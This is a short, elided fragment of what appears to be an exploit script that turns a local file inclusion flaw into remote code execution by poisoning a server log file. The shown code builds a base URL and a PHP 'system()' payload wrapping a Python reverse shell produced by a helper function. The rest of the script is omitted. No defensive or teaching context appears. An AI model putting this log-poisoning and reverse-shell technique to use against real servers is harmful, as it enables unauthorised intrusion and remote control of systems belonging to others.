...
# DESCRIPTION                                                                                               #
#                                                                                                           #
# Get RCE on server that is vulnerable for LFI by poison logfile                                            #
#                                                                                                           #
...
def poison():
    ...
    i = URL.rfind('/') + 1
    base_url = URL[:i]
    payload = '''<?php system('%s');?>''' % BuildPythonReverseShell()
